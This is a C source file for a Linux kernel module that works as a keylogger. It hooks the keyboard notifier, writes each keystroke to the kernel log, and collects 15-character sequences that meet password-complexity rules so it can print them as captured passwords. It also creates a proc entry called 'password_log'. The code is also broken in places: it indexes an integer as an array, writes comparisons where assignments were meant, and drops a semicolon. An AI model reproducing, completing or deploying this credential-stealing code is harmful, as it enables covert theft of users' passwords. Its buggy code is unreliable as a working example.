#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <asm/io.h>

#define PROC_FILE_NAME "password_log"
size_t tcount = 0;
unsigned long int lasttime;
struct notifier_block nb;

int keymap[36]       = {2,3,4,5,6,7,8,9,10,11,16,17,18,19,20,21,22,23,24,25,30,31,32,33,34,35,36,37,38,44,45,46,47,48,49,50};
char characters[36]  = {'1','2','3','4','5','6','7','8','9','0','q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m'};
char shift_chars[36] = {'!','@','#','$','%','^','&','*','(',')','Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C','V','B','N','M'};
char password_checker[15];

ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp ){
	char buffer[128];
	unsigned long int newtime = jiffies;
	int calls_per_second = (HZ * tcount) / (newtime - lasttime);
	tcount = 0;
	lasttime = newtime;
	sprintf(buffer, "Calls Per Second: %d\n", calls_per_second);
	strcpy(buf, buffer);
	return strlen(buffer);
}

struct file_operations pfo = {
	read: read_simple,
	write: 0
};

int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
	int i;
	int j;
	int k;
	int x;
	int password_counter  = 0;
	int password_reqs = 0;
	bool has_lowercase    = false;
	bool has_uppercase    = false;
	bool has_number	      = false;
	bool has_special      = false;

	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;

	for(i = 0; i < 36; i++){
		if(keymap[i] == kp->value && kp->shift == 0 || kp->ledstate == 0){
			printk("char: %c\n", characters[i]);
			password_checker[password_counter] = characters[i];
			password_counter++;
		}
		else if (keymap[i] == kp->value && kp->shift == 1){
			keymap[i] == shift_chars[i] - 32;
			printk("char: %c\n Shift: %x\n", shift_chars[i], kp->shift);
			keymap[i] == shift_chars[i] + 32;
			password_checker[password_counter] = characters[i];
			password_counter++;
		}
		else if (keymap[i] == kp->value && kp->ledstate == 1){
			keymap[i] == shift_chars[i] - 32;
			printk("char: %c\n Lights: %d\n", shift_chars[i], kp->ledstate);
			keymap[i] == shift_chars[i] - 32;
			password_checker[password_counter] = characters[i];
			password_counter++;
		}
		else{
			continue;
		}
	}
	if(action == 1 && kp->down){
		tcount++;
	}
	
	if(password_counter >= 15){
		
		for(j = 0; j < password_counter; j++){
			for(k = 0; k < 36; k++){
				if(password_counter[j] == characters[k] && k < 12 && has_number == false){
					has_number = true;
					password_reqs++;
				}
				else if(password_counter[j] ==  characters[k] && k > 12 && has_lowercase  == false){
					has_lowercase = true;
					password_reqs++;
				}
				else if(password_counter[j] == shift_chars[k] && k < 12 && has_special   == false){
					has_special = true;
					password_reqs++;
				}
				else if(password_counter[j] == shift_chars[k] && k > 12 && has_uppercase == false){
					has_uppercase = true;
					password_reqs++;
				}				
			}
			
		}
		if(password_reqs > 3){
			for(x = 0; x < 15; x++){
				printk(password_checker[x])
			}
		}
		else{
			printk("invalid password");
		}
		printk("password confirmed:\n");
		password_counter = 0;
		password_reqs = 0;
		has_special   = false;
		has_uppercase = false;
		has_lowercase = false;
		has_number    = false;
	}
	return 0;
}

int init (void) {
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	proc_create(PROC_FILE_NAME,0,NULL,&pfo);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);
